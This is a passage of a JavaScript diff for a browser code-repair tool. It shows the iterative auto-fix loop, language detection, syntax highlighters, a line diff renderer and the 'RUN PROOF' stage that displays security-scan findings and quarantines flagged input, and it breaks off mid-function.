+  return {
+    get code(){return code}, get n(){return n}, get done(){return done}, get halted(){return halted},
+    next(){
+      if(done)return null;
+      const r=step(code);
+      if(!r||r.halt){ done=true; halted=r||{halt:true,clean:false}; return null; }
+      if(r.code===code){ done=true; halted={halt:true,clean:false,err:{message:'repair made no progress'}}; return null; }
+      const sig=r.repair.rule+'@'+(r.repair.line==null?'?':r.repair.line);
+      if(sig===lastSig){ streak++; if(streak>=4){ done=true; halted={halt:true,clean:false,err:{message:'repair loop detected'}}; return null; } }
+      else { streak=0; lastSig=sig; }
+      code=r.code; n++;
+      return r;
+    }
+  };
+}
+function sessionRun(lang,src,maxIt){
+  const s=makeSession(lang,src);
+  const fixes=[]; let it=0;
+  while(!s.done&&it<maxIt){ it++; const r=s.next(); if(r)fixes.push(r.repair); }
+  return {code:s.code,fixes,iters:it};
+}
+function fixJS(src){ const r=sessionRun('js',src,80); const fin=parseJS(r.code);
+  return Object.assign(r,{ok:fin.ok,err:fin.ok?null:{message:fin.message||'syntax error',line:fin.line}}); }
+function fixJava(src){ const r=sessionRun('java',src,80); const fin=parseJava(r.code);
+  return Object.assign(r,{ok:fin.ok,tokens:fin.tokens,types:fin.types,err:fin.ok?null:{message:fin.msg||'syntax error',line:fin.line}}); }
+function fixPython(src){ const r=sessionRun('python',src,90); const fin=verifyFinal('python',r.code);
+  return Object.assign(r,{ok:fin.ok,err:fin.err}); }
+function fixJSON(src){ const r=sessionRun('json',src,60); const fin=tryJSON(r.code);
+  return Object.assign(r,{ok:fin.ok,err:fin.ok?null:{message:(fin.message||'invalid JSON').replace(/^JSON\.parse: */,''),line:fin.line}}); }
+function fixCSS(src){ const r=sessionRun('css',src,50); const fin=verifyFinal('css',r.code);
+  return Object.assign(r,{ok:fin.ok,err:fin.err}); }
+function fixHTML(src){ const r=sessionRun('html',src,60); const fin=verifyFinal('html',r.code);
+  return Object.assign(r,{ok:fin.ok,err:fin.err}); }
+function fixXML(src){ const r=sessionRun('xml',src,60); const fin=verifyFinal('xml',r.code);
+  return Object.assign(r,{ok:fin.ok,extra:fin.ok?{elements:fin.elements}:null,err:fin.err}); }
+
+const RUNNERS={js:fixJS,java:fixJava,python:fixPython,json:fixJSON,css:fixCSS,html:fixHTML,xml:fixXML};
+const LANGNAME={js:'JAVASCRIPT',java:'JAVA',python:'PYTHON',json:'JSON',css:'CSS',html:'HTML',xml:'XML'};
+const ORACLE={js:'ACORN PARSER',java:'JAVA GRAMMAR PARSER',python:'STRUCTURE SCAN',json:'JSON.PARSE',css:'BALANCE SCAN',html:'TAG SCAN',xml:'DOMPARSER(text/xml)'};
+
+/* ---------------- detection & re-routing ---------------- */
+function detectLang(code){
+  const t=code.trim(); if(!t)return null;
+  try{ JSON.parse(t); return 'json'; }catch(e){}
+  if(/^\s*<\?xml/i.test(t))return 'xml';
+  if(/^\s*<!doctype\s+html/i.test(t)||/<html[\s>]/i.test(t))return 'html';
+  if(/^[{\[]/.test(t)){
+    const noStr=t.replace(/"(?:\\.|[^"\\])*"/g,'');
+    const looksJava=/\b(new|return|if|for|while)\b/.test(t)||/=>/.test(t);
+    if(!/;/.test(noStr)&&!looksJava)return 'json';
+  }
+  const j=[
+    /(?:^|\n)\s*(?:public|private|protected|final|abstract)\s+(?:[\w$]+\s+)*(?:class|interface|enum)\s/.test(t),
+    /public\s+static\s+void\s+main/.test(t),
+    /System\.out\.print/.test(t),
+    /(?:^|\n)\s*import\s+java[x]?\./.test(t),
+    /String\[\]\s*[\w$]+/.test(t)
+  ].filter(Boolean).length;
+  if(j>=1)return 'java';
+  let py=0;
+  if(/(^|\n)\s*def\s+\w+\s*\(/.test(t))py++;
+  if(/(^|\n)\s*class\s+\w+.*:\s*$/m.test(t))py++;
+  if(/(^|\n)\s*(import\s+\w|from\s+[\w.]+\s+import)/.test(t))py++;
+  if(/(^|\n)\s*elif\s/.test(t))py++;
+  if(/\bself\./.test(t))py++;
+  if(/(^|\n)\s*print\(/.test(t))py++;
+  if(/(^|\n)\s*#/.test(t))py++;
+  const jsScore=(t.match(/\b(function|const|let|var|return|console|document|window|typeof|new)\b|=>|===|;/g)||[]).length;
+  if(py>=2&&j===0&&jsScore<=1)return 'python';
+  const cssBlocks=(t.match(/[^{};]+\{[^{}]*:[^{}]*\}/g)||[]).length;
+  if(cssBlocks>=2&&jsScore<=1)return 'css';
+  return 'js';
+}
+function oracleOk(L,code){
+  try{
+    switch(L){
+      case 'js': return parseJS(code).ok;
+      case 'java': return parseJava(code).ok;
+      case 'json': return tryJSON(code).ok;
+      case 'html': return htmlPass(code).ok===true;
+      case 'xml': return xmlVerify(code).ok;
+      case 'python': return pyOracleOk(code);
+      case 'css': {
+        if(/\b(function|const|let|var)\b|=>|\bdef\s|\bclass\s+[A-Za-z_(]|\bSystem\./.test(code))return false;
+        const bare=code.replace(/(["'])(?:(?!\1).)*\1/g,'');
+        if(bare.includes('='))return false;
+        const s=cssScan(code);
+        return !s.extra&&!s.stack.length&&!oddBlockComment(code)&&/[-a-zA-Z]+\s*:/.test(bare);
+      }
+    }
+  }catch(e){}
+  return false;
+}
+function rerouteLang(src,from){
+  const order=['js','java','python','json','css','html','xml'];
+  for(const L of order){
+    if(L===from)continue;
+    if(from==='json'&&L==='js')continue;
+    if(from==='js'&&L==='json')continue;
+    if(oracleOk(L,src))return L;
+  }
+  return null;
+}
+
+/* ---------------- highlighters ---------------- */
+function hlJS(src){
+  const re=/(\/\/[^\n]*|\/\*[\s\S]*?(?:\*\/|$))|("(?:\\.|[^"\\\n])*"?|'(?:\\.|[^'\\\n])*'?|`(?:\\.|[^`\\])*`?)|\b(function|const|let|var|if|else|for|while|do|switch|case|default|break|continue|return|class|extends|new|this|super|typeof|instanceof|in|of|try|catch|finally|throw|delete|void|yield|await|async|static|import|export|from)\b|\b(true|false|null|undefined|NaN|Infinity)\b|\b(0[xX][0-9a-fA-F]+|\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)\b/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="tk-c">'+esc(m[1])+'</span>';
+    else if(m[2])out+='<span class="tk-s">'+esc(m[2])+'</span>';
+    else if(m[3])out+='<span class="tk-k">'+esc(m[3])+'</span>';
+    else if(m[4])out+='<span class="tk-b">'+esc(m[4])+'</span>';
+    else if(m[5])out+='<span class="tk-n">'+esc(m[5])+'</span>';
+    else out+=esc(m[0]);
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+function hlJava(src){
+  const re=/(\/\/[^\n]*|\/\*[\s\S]*?(?:\*\/|$))|("""[\s\S]*?(?:"""|$)|"(?:\\.|[^"\\\n])*"?|'(?:\\.|[^'\\\n])*'?)|(@[A-Za-z_$][\w$]*)|\b(package|import|public|private|protected|static|final|abstract|class|interface|enum|void|int|long|short|byte|char|float|double|boolean|return|if|else|for|while|do|switch|case|default|break|continue|new|this|super|extends|implements|throws|throw|try|catch|finally|instanceof|true|false|null|var)\b|\b(0[xXbB][0-9a-fA-F_]+|\d[\d_]*(?:\.\d+)?(?:[eE][+-]?\d+)?[fFdDlL]?)\b|\b([A-Z][A-Za-z0-9_]*)\b/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="tk-c">'+esc(m[1])+'</span>';
+    else if(m[2])out+='<span class="tk-s">'+esc(m[2])+'</span>';
+    else if(m[3])out+='<span class="tk-n">'+esc(m[3])+'</span>';
+    else if(m[4])out+='<span class="tk-k">'+esc(m[4])+'</span>';
+    else if(m[5])out+='<span class="tk-n">'+esc(m[5])+'</span>';
+    else if(m[6])out+='<span class="tk-t">'+esc(m[6])+'</span>';
+    else out+=esc(m[0]);
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+function hlPython(src){
+  const re=/(#[^\n]*)|('''[\s\S]*?(?:'''|$)|"""[\s\S]*?(?:"""|$)|[rbfu]{0,2}"(?:\\.|[^"\\\n])*"?|[rbfu]{0,2}'(?:\\.|[^'\\\n])*'?)|(@[A-Za-z_][\w.]*)|\b(and|as|assert|async|await|break|class|continue|def|del|elif|else|except|False|finally|for|from|global|if|import|in|is|lambda|None|nonlocal|not|or|pass|raise|return|True|try|while|with|yield|match|case|self)\b|\b(0[xX][0-9a-fA-F_]+|\d[\d_]*(?:\.\d+)?(?:[eE][+-]?\d+)?)\b/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="tk-c">'+esc(m[1])+'</span>';
+    else if(m[2])out+='<span class="tk-s">'+esc(m[2])+'</span>';
+    else if(m[3])out+='<span class="tk-n">'+esc(m[3])+'</span>';
+    else if(m[4])out+='<span class="tk-k">'+esc(m[4])+'</span>';
+    else out+='<span class="tk-n">'+esc(m[5])+'</span>';
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+function hlJSON(src){
+  const re=/("(?:\\.|[^"\\\n])*")(\s*:)?|\b(true|false|null)\b|(-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="'+(m[2]?'tk-k':'tk-s')+'">'+esc(m[1])+'</span>'+(m[2]?esc(m[2]):'');
+    else if(m[3])out+='<span class="tk-b">'+esc(m[3])+'</span>';
+    else out+='<span class="tk-n">'+esc(m[4])+'</span>';
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+function hlCSS(src){
+  const re=/(\/\*[\s\S]*?(?:\*\/|$))|("(?:\\.|[^"\\\n])*"?|'(?:\\.|[^'\\\n])*'?)|(@[\w-]+)|(#[0-9a-fA-F]{3,8}\b)|(!important\b)|([a-zA-Z-]+(?=\s*:))|(-?\d*\.?\d+(?:px|em|rem|vh|vw|vmin|vmax|s|ms|deg|fr|ch|%)?)/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="tk-c">'+esc(m[1])+'</span>';
+    else if(m[2])out+='<span class="tk-s">'+esc(m[2])+'</span>';
+    else if(m[3]||m[5])out+='<span class="tk-k">'+esc(m[3]||m[5])+'</span>';
+    else if(m[4])out+='<span class="tk-n">'+esc(m[4])+'</span>';
+    else if(m[6])out+='<span class="tk-k">'+esc(m[6])+'</span>';
+    else if(m[7])out+='<span class="tk-n">'+esc(m[7])+'</span>';
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+function hlHTML(src){
+  const re=/(<!--[\s\S]*?(?:-->|$))|(<![^>]*>?|<\/?[a-zA-Z][\w:-]*|\/?>)|([a-zA-Z_:][\w:.-]*)(?==)|("[^"]*"?|'[^']*'?)/g;
+  let out='',last=0,m;
+  while((m=re.exec(src))){
+    out+=esc(src.slice(last,m.index));
+    if(m[1])out+='<span class="tk-c">'+esc(m[1])+'</span>';
+    else if(m[2])out+='<span class="tk-k">'+esc(m[2])+'</span>';
+    else if(m[3])out+='<span class="tk-n">'+esc(m[3])+'</span>';
+    else if(m[4])out+='<span class="tk-s">'+esc(m[4])+'</span>';
+    last=m.index+m[0].length;
+  }
+  return out+esc(src.slice(last));
+}
+const HL={js:hlJS,java:hlJava,python:hlPython,json:hlJSON,css:hlCSS,html:hlHTML,xml:hlHTML};
+
+/* ---------------- receipts ---------------- */
+function countAst(ast){
+  let n=0;
+  (function w(x){ if(!x||typeof x!=='object')return;
+    if(Array.isArray(x)){ x.forEach(w); return; }
+    if(typeof x.type==='string'){ n++; for(const k in x)w(x[k]); } })(ast);
+  return n;
+}
+function jsonStats(v){
+  let depth=0,keys=0;
+  (function w(x,d){
+    if(Array.isArray(x)){ depth=Math.max(depth,d); x.forEach(y=>w(y,d+1)); }
+    else if(x&&typeof x==='object'){ depth=Math.max(depth,d); for(const k in x){ keys++; w(x[k],d+1); } }
+  })(v,1);
+  return {depth,keys,root:Array.isArray(v)?'ARRAY':(v===null?'NULL':typeof v)};
+}
+function htmlStats(code){
+  const re=/<(\/?)([a-zA-Z][\w:-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)(\/?)>/g;
+  let open=0,close=0,voids=0,m;
+  while((m=re.exec(code))){
+    if(m[1]==='/')close++;
+    else if(m[4]==='/'||VOID_EL.has(m[2].toLowerCase()))voids++;
+    else open++;
+  }
+  return {open,close,voids};
+}
+function makeReceipt(lang,code,res){
+  try{
+    if(lang==='js'&&typeof acorn!=='undefined'){
+      const mod=/^\s*(import\s|export\s)/m.test(code);
+      const ast=acorn.parse(code,{ecmaVersion:'latest',allowReturnOutsideFunction:true,allowAwaitOutsideFunction:true,sourceType:mod?'module':'script'});
+      return 'ACORN AST · '+countAst(ast)+' NODES · 0 ERRORS';
+    }
+    if(lang==='java')return 'JAVA GRAMMAR · '+(res.tokens||0)+' TOKENS · '+(res.types||0)+' TYPE DECLS · 0 ERRORS';
+    if(lang==='json'){ const s=jsonStats(JSON.parse(code)); return 'JSON.PARSE · ROOT '+s.root.toUpperCase()+' · DEPTH '+s.depth+' · '+s.keys+' KEYS'; }
+    if(lang==='html'){ const s=htmlStats(code); return 'TAG SCAN · '+s.open+' OPEN / '+s.close+' CLOSE · '+s.voids+' VOID'; }
+    if(lang==='css'){ const b=(code.match(/\{/g)||[]).length; const d=(code.match(/[{;]\s*[-a-zA-Z]+\s*:/g)||[]).length; return 'BALANCE OK · '+b+' BLOCKS · '+d+' DECLS'; }
+    if(lang==='python'){ return 'STRUCTURE OK · '+((code.match(/:\s*$/m)||[]).length)+' BLOCK HEADERS · BALANCED'; }
+    if(lang==='xml'){ const v=xmlVerify(code); if(v.ok)return 'DOMPARSER · WELL-FORMED · '+v.elements+' ELEMENTS · 0 ERRORS'; }
+  }catch(e){}
+  return 'RE-VERIFIED · 0 ERRORS';
+}
+
+/* ---------------- diff ---------------- */
+function diffOps(A,B){
+  let pre=0; const n0=A.length,m0=B.length;
+  while(pre<n0&&pre<m0&&A[pre]===B[pre])pre++;
+  let suf=0;
+  while(suf<n0-pre&&suf<m0-pre&&A[n0-1-suf]===B[m0-1-suf])suf++;
+  const a=A.slice(pre,n0-suf),b=B.slice(pre,m0-suf);
+  const ops=A.slice(0,pre).map(l=>({t:'eq',l}));
+  const n=a.length,m=b.length;
+  if(n&&m){
+    if((n+1)*(m+1)>6e6){ a.forEach(l=>ops.push({t:'del',l})); b.forEach(l=>ops.push({t:'add',l})); }
+    else{
+      const dp=new Uint32Array((n+1)*(m+1));
+      for(let i=n-1;i>=0;i--)for(let j=m-1;j>=0;j--){
+        dp[i*(m+1)+j]=a[i]===b[j]?dp[(i+1)*(m+1)+j+1]+1:Math.max(dp[(i+1)*(m+1)+j],dp[i*(m+1)+j+1]);
+      }
+      let i=0,j=0;
+      while(i<n&&j<m){
+        if(a[i]===b[j]){ ops.push({t:'eq',l:a[i]}); i++; j++; }
+        else if(dp[(i+1)*(m+1)+j]>=dp[i*(m+1)+j+1]){ ops.push({t:'del',l:a[i]}); i++; }
+        else{ ops.push({t:'add',l:b[j]}); j++; }
+      }
+      while(i<n)ops.push({t:'del',l:a[i++]});
+      while(j<m)ops.push({t:'add',l:b[j++]});
+    }
+  } else if(n)a.forEach(l=>ops.push({t:'del',l}));
+  else if(m)b.forEach(l=>ops.push({t:'add',l}));
+  for(let k=n0-suf;k<n0;k++)ops.push({t:'eq',l:A[k]});
+  return ops;
+}
+function hotLinesOf(prev,cur){
+  const ops=diffOps(prev.split('\n'),cur.split('\n'));
+  const hot=new Set(); let ln=0,i=0;
+  while(i<ops.length){
+    if(ops[i].t==='eq'){ ln++; i++; continue; }
+    let dels=0,adds=0;
+    while(i<ops.length&&ops[i].t==='del'){ dels++; i++; }
+    while(i<ops.length&&ops[i].t==='add'){ adds++; i++; }
+    const pair=Math.min(dels,adds);
+    for(let k=0;k<pair;k++){ ln++; hot.add(ln); }
+    for(let k=pair;k<adds;k++){ ln++; hot.add(ln); }
+  }
+  return hot;
+}
+function renderDiff(orig,fixed,lang,hot){
+  const ops=diffOps(orig.split('\n'),fixed.split('\n'));
+  const rows=[]; let ln=0,i=0;
+  const H=n=>hot&&hot.has(n)?' hot':'';
+  const rowEq=l=>{ ln++; return '<span class="dl'+H(ln)+'"><span class="ln">'+ln+'</span>'+(HL[lang](l)||' ')+'</span>'; };
+  const rowAddN=(l,num)=>'<span class="dl add'+H(num)+'"><span class="ln">'+num+'</span>'+(HL[lang](l)||' ')+'</span>';
+  const rowDel=l=>'<span class="dl del"><span class="ln">−</span>'+(esc(l)||' ')+'</span>';
+  const rowMod=(o,nw)=>{
+    ln++;
+    let p=0; const maxPre=Math.min(o.length,nw.length);
+    while(p<maxPre&&o[p]===nw[p])p++;
+    let s=0; const maxSuf=maxPre-p;
+    while(s<maxSuf&&o[o.length-1-s]===nw[nw.length-1-s])s++;
+    const om=o.slice(p,o.length-s),nm=nw.slice(p,nw.length-s);
+    if((om.length&&om.length>o.length*0.6)||(nm.length&&nm.length>nw.length*0.6)||o.length>240)return rowDel(o)+rowAddN(nw,ln);
+    let body=esc(o.slice(0,p));
+    if(om)body+='<span class="cr">'+esc(om)+'</span>';
+    if(nm)body+='<span class="ca">'+esc(nm)+'</span>';
+    body+=esc(o.slice(o.length-s));
+    return '<span class="dl mod'+H(ln)+'"><span class="ln">'+ln+'</span>'+(body||' ')+'</span>';
+  };
+  while(i<ops.length){
+    const op=ops[i];
+    if(op.t==='eq'){ rows.push(rowEq(op.l)); i++; continue; }
+    const dels=[],adds=[];
+    while(i<ops.length&&ops[i].t==='del')dels.push(ops[i++].l);
+    while(i<ops.length&&ops[i].t==='add')adds.push(ops[i++].l);
+    const pair=Math.min(dels.length,adds.length);
+    for(let k=0;k<pair;k++)rows.push(rowMod(dels[k],adds[k]));
+    for(let k=pair;k<dels.length;k++)rows.push(rowDel(dels[k]));
+    for(let k=pair;k<adds.length;k++){ ln++; rows.push(rowAddN(adds[k],ln)); }
+  }
+  return rows.join('');
+}
+function renderDiag(src,lang,lines){
+  const set=new Set(lines.filter(Boolean));
+  return src.split('\n').map((l,i)=>{
+    const bad=set.has(i+1);
+    return '<span class="dl'+(bad?' errline':'')+'"><span class="ln">'+(bad?'!':(i+1))+'</span>'+(HL[lang](l)||' ')+'</span>';
+  }).join('');
+}
+
+/* ---------------- locks, chrome ---------------- */
+function setUnlocked(ok,reason){
+  const chip=$('lockChip');
+  [$('copyBtn'),$('dlBtn')].forEach(b=>{ b.disabled=!ok; b.classList.toggle('locked',!ok); b.classList.remove('justUnlocked'); });
+  const was=chip.dataset.state;
+  if(ok){
+    if(was!=='unlocked'){
+      chip.classList.remove('locked'); chip.classList.add('unlocked');
+      $('copyBtn').classList.add('justUnlocked'); $('dlBtn').classList.add('justUnlocked');
+      toast('VERIFIED — COPY UNLOCKED',true);
+    }
+    chip.dataset.state='unlocked';
+    $('lockTxt').textContent='COPY UNLOCKED';
+  } else {
+    chip.dataset.state='locked'; chip.classList.add('locked'); chip.classList.remove('unlocked');
+    $('lockTxt').textContent=reason||'COPY LOCKED';
+  }
+}
+function setSecChip(level,count){
+  const c=$('secChip');
+  c.classList.remove('warn','crit');
+  if(level==='CLEAN')$('secTxt').textContent='SEC: CLEAN';
+  else if(level==='SUSPICIOUS'){ c.classList.add('warn'); $('secTxt').textContent='SEC: '+count+' FLAG'+(count===1?'':'S'); }
+  else if(level==='MALICIOUS'){ c.classList.add('crit'); $('secTxt').textContent='SEC: QUARANTINE'; }
+  else $('secTxt').textContent='SEC: —';
+}
+function setFixBtn(mode,label,disabled){
+  const b=$('fixBtn');
+  b.disabled=!!disabled;
+  b.classList.remove('armed','done');
+  if(mode)b.classList.add(mode);
+  $('fixTxt').textContent=label;
+}
+function setChromeEnabled(on){
+  $('runBtn').disabled=!on;
+  $('clearBtn').disabled=!on;
+  document.querySelectorAll('.chip').forEach(c=>c.disabled=!on);
+  $('edWrap').classList.toggle('busy',!on);
+  if(on)ed.removeAttribute('readonly'); else ed.setAttribute('readonly','');
+}
+
+/* ---------------- UI wiring ---------------- */
+const ed=$('ed'),hlEl=$('hl'),gut=$('gutter');
+const OUT_EMPTY='<div class="out-empty"><span class="orn">¶</span><p>the corrected copy lands here</p><small>SECURITY SCAN → DIAGNOSIS → LIVE AUTO FIX.<br>ONE REAL REPAIR PER PASS, RE-PARSED EACH STEP.<br>COPY UNLOCKS ONLY ON VERIFICATION.</small></div>';
+
+function updateGutter(){
+  const n=ed.value.split('\n').length;
+  let h='';
+  for(let i=1;i<=n;i++)h+='<div>'+i+'</div>';
+  gut.innerHTML=h;
+}
+function updateHL(){ hlEl.innerHTML=HL[detectLang(ed.value)||'js'](ed.value)+'\n'; }
+function updateInStats(){
+  const v=ed.value,lang=detectLang(v);
+  $('inStats').textContent=(v?v.split('\n').length:0)+' LINES · '+v.length+' CHARS'+(lang?' · '+LANGNAME[lang]:'');
+}
+ed.addEventListener('scroll',()=>{ hlEl.scrollTop=ed.scrollTop; hlEl.scrollLeft=ed.scrollLeft; gut.scrollTop=ed.scrollTop; });
+function invalidate(hint){
+  if(state.stage==='running')return;
+  state.stage=null; state.diagOk=false; state.diagLines=[]; state.sec=null;
+  state.lastCode=null; state.lastSrc=null;
+  setUnlocked(false,'RUN PROOF FIRST');
+  setFixBtn(null,'AUTO FIX',true);
+  setSecChip(null,0);
+  $('ledger').innerHTML='<div class="margin-note">'+(hint||'press RUN PROOF —<br>security scan + errors<br>show here.')+'</div>';
+  $('pane2Name').textContent='ISSUES FOUND';
+  $('fixCount').textContent='—';
+  $('passInfo').textContent='AWAITING PROOF';
+  $('out').innerHTML=OUT_EMPTY;
+  $('stamp').hidden=true;
+  $('errText').textContent=''; $('errText').className='';
+  $('outMeta').textContent='';
+}
+let hlT=null;
+ed.addEventListener('input',()=>{
+  clearTimeout(hlT); hlT=setTimeout(()=>{ updateHL(); updateGutter(); updateInStats(); },90);
+  invalidate();
+});
+ed.addEventListener('paste',()=>setTimeout(()=>{
+  updateHL(); updateGutter(); updateInStats();
+  invalidate();
+  toast('PASTED — PRESS RUN PROOF');
+},80));
+ed.addEventListener('keydown',e=>{
+  if(e.key==='Tab'){
+    e.preventDefault();
+    ed.setRangeText('  ',ed.selectionStart,ed.selectionEnd,'end');
+    ed.dispatchEvent(new Event('input'));
+  }
+});
+document.addEventListener('keydown',e=>{
+  if((e.metaKey||e.ctrlKey)&&e.key==='Enter'){
+    e.preventDefault();
+    if(e.shiftKey){
+      if(state.stage==='running')stopFix();
+      else if(!$('fixBtn').disabled&&$('fixBtn').classList.contains('armed'))$('fixBtn').click();
+    }
+    else if(state.stage!=='running')runProof(true);
+  }
+});
+
+/* ---------------- SEC entry rendering ---------------- */
+function secEntryHTML(f,i){
+  const crit=f.cat==='secret'||f.w>=50;
+  const cls='entry '+(crit?'seccrit':'secentry');
+  return '<div class="'+cls+'">'+
+    '<div class="e-top"><span class="e-num '+(crit?'':'sh')+'">⚠</span>'+
+    '<span class="e-rule">SEC — '+esc(f.id)+'</span>'+
+    '<span class="e-w">'+f.w+'</span>'+
+    (f.line?'<span class="e-loc">L'+f.line+'</span>':'')+'</div>'+
+    '<div class="e-msg">'+esc(f.msg)+'</div>'+
+    (f.snippet?'<div class="e-code"><span class="rm">'+esc(f.snippet)+'</span></div>':'')+
+    '</div>';
+}
+
+/* ---------------- STAGE 1 · RUN PROOF ---------------- */
+function entryHTML(f,i,mode){
+  const showCode=f.before!=null||f.after!=null;
+  let code='';
+  if(showCode){
+    const rm=f.before?'<span class="rm">'+esc(f.before)+'</span>':'';
+    const ad=f.after?'<span class="ad">'+esc(f.after)+'</span>':'';
+    code='<div class="e-code">'+rm+((rm&&ad)?'<span class="sep">→</span>':'')+ad+'</div>';
+  }
+  const num=mode==='diag'?'▲':String(i+1).padStart(2,'0');
+  const cls='entry'+(mode==='diag'?' detected':'');
+  return '<div class="'+cls+'" style="animation-delay:'+Math.min(i,14)*65+'ms">'+
+    '<div class="e-top"><span class="e-num">'+num+'</span>'+
+    '<span class="e-rule">'+esc(f.rule)+'</span>'+
+    (f.line?'<span class="e-loc">L'+f.line+'</span>':'')+'</div>'+code+'</div>';
+}
+function retriggerStamp(){
+  const s=$('stamp'); s.style.animation='none'; void s.offsetWidth; s.style.animation='';
+}
+function quarantined(sec){ return sec.level==='MALICIOUS'||sec.hasSecret; }
+function runProof(explicit){
+  if(state.stage==='running')return;
+  const src=ed.value;
+  if(!src.trim()){ invalidate('paste code, then press<br>RUN PROOF — security scan<br>+ errors show here.'); return; }
+  const sec=secScan(src);
+  state.sec=sec;
+  setSecChip(sec.level,sec.findings.length);
+  const det=detectLang(src);
+  let lang=state.override==='auto'?(det||'js'):state.override;
+  let res=RUNNERS[lang](src);
+  let rerouted=null;
+  if(!res.ok&&!res.fixes.length){
+    const alt=rerouteLang(src,lang);
+    if(alt){ rerouted=lang; lang=alt; res=RUNNERS[alt](src); }
+  }
+  state.lastSrc=src; state.lastLang=lang;
+  state.stage='diag'; state.diagOk=res.ok;
+  state.diagLines=res.fixes.map(f=>f.line);
+  state.lastCode=null;
+
+  $('detected').textContent=(rerouted?('RE-ROUTED → '+LANGNAME[lang]):(state.override==='auto'?(det?'→ '+LANGNAME[det]+' DETECTED':''):'OVERRIDE: '+LANGNAME[lang]));
+
+  let html='';
+  if(sec.findings.length){
+    html+='<div class="entry reroute"><div class="e-top"><span class="e-num">⛨</span>'+
+      '<span class="e-rule">SECURITY SCAN — '+sec.level.toUpperCase()+' · SCORE '+sec.score+'/100 · '+sec.findings.length+' FINDING'+(sec.findings.length===1?'':'S')+(sec.hasSecret?' · SECRETS DETECTED':'')+'</span></div></div>';
+    html+=sec.findings.slice(0,12).map(secEntryHTML).join('');
+    if(sec.findings.length>12)html+='<div class="entry more">+ '+(sec.findings.length-12)+' MORE SECURITY FINDINGS</div>';
+  }
+  if(quarantined(sec)){
+    html+='<div class="entry prognosis p-quar">QUARANTINED — COPY/DOWNLOAD LOCKED UNTIL SANITIZE RUNS ('+sec.findings.length+' THREAT'+(sec.findings.length===1?'':'S')+')</div>';
+  }
+  if(!res.fixes.length){
+    html+=res.ok?'<div class="margin-note">syntax spotless — the parser<br>finds nothing wrong.</div>'
+              :'<div class="margin-note">errors resist my rules —<br>no known auto-repair.</div>';
+  } else {
+    html+=res.fixes.slice(0,30).map((f,i)=>entryHTML(f,i,'diag')).join('');
+    if(res.fixes.length>30)html+='<div class="entry more">+ '+(res.fixes.length-30)+' MORE ISSUES</div>';
+    html+=res.ok&&!quarantined(sec)
+      ? '<div class="entry prognosis p-good">PROGNOSIS — AUTO FIX RESOLVES ALL '+res.fixes.length+' → VERIFIED</div>'
+      : '<div class="entry prognosis p-bad">PROGNOSIS — '+res.fixes.length+' REPAIRS POSSIBLE'+(quarantined(sec)?' · QUARANTINE ACTIVE':' · SOME ERRORS WILL REMAIN')+'</div>';
+  }
+  $('ledger').innerHTML=html;
+  $('pane2Name').textContent=quarantined(sec)?'SECURITY QUARANTINE':'ISSUES FOUND';
+  const totalIssues=sec.findings.length+res.fixes.length;
+  $('fixCount').textContent=quarantined(sec)?('QUARANTINE · '+sec.findings.length):(totalIssues?(totalIssues+' ISSUE'+(totalIssues===1?'':'S')):(res.ok?'CLEAN':'UNFIXABLE'));
+
+  $('out').innerHTML=(res.ok&&!res.fixes.length&&!sec.findings.length)
+    ? '<div class="plain-code">'+(HL[lang](src)||' ')+'</div>'
+    : renderDiag(src,lang,state.diagLines.concat(sec.findings.map(f=>f.line)));
+
+  const stamp=$('stamp');
+  stamp.hidden=false;
+  if(quarantined(sec)){ stamp.className='stamp quar'; stamp.textContent='QUARANTINED · '+sec.findings.length+' THREAT'+(sec.findings.length===1?'':'S'); }
+  else if(res.ok&&!res.fixes.length){ stamp.className='stamp ok'; stamp.textContent='VERIFIED · CLEAN'; }
+  else{ stamp.className='stamp'; stamp.textContent=totalIssues+' ISSUE'+(totalIssues===1?'':'S')+' FOUND'; }
+  retriggerStamp();
+
+  const et=$('errText');
+  if(quarantined(sec)){ et.textContent=(sec.hasSecret?'SECRETS/MALWARE DETECTED':'MALICIOUS CODE DETECTED')+' — PRESS SANITIZE TO NEUTRALIZE'; et.className='bad'; }
+  else if(res.ok&&!res.fixes.length){ et.textContent='VERIFIED · '+makeReceipt(lang,src,res); et.className='good'; }
+  else if(!res.fixes.length){ et.textContent=trimMid((res.err&&res.err.message)||'unrecognized errors',95); et.className='bad'; }
+  else if(res.ok){ et.textContent='ALL ISSUES AUTO-REPAIRABLE — PRESS AUTO FIX TO WATCH IT RUN'; et.className='warn'; }
+  else { et.textContent='PARTIAL REPAIR ONLY — SOME ERRORS WILL REMAIN'; et.className='bad'; }
+
+  $('passInfo').textContent='SEC: '+sec.level+' ('+sec.score+') · ORACLE: '+ORACLE[lang]+' · '+(res.fixes.length?res.fixes.length+' SYNTAX ISSUE'+(res.fixes.length===1?'':'S'):'SYNTAX CLEAN');
+  $('outMeta').textContent=LANGNAME[lang];
+
+  if(quarantined(sec)){
+    setUnlocked(false,'QUARANTINED — SANITIZE FIRST');
+    setFixBtn('armed','SANITIZE ('+sec.findings.length+')',false);
+    state.stage='sec';
+  }
+  else if(res.ok&&!res.fixes.length){ state.lastCode=src; state.stage='fixed'; setUnlocked(true); setFixBtn(null,'NOTHING TO FIX',true); }
+  else if(res.fixes.length){ setUnlocked(false,'PRESS AUTO FIX'); setFixBtn('armed','AUTO FIX ('+res.fixes.length+')',false); }
+  else { setUnlocked(false,'NO KNOWN REPAIR'); setFixBtn(null,'NO KNOWN REPAIR',true); }
+
+  if(explicit){
+    requestAnimationFrame(()=>{
